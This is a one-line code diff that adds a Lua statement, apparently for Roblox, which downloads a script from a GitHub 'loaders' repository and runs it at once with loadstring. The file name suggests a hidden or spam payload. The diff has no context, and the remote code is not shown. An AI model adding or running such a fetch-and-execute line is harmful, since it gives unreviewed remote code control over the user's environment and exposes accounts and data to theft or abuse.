@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/hide-in-pixels-spam2-zy1bu38am01e0a.lua"))()
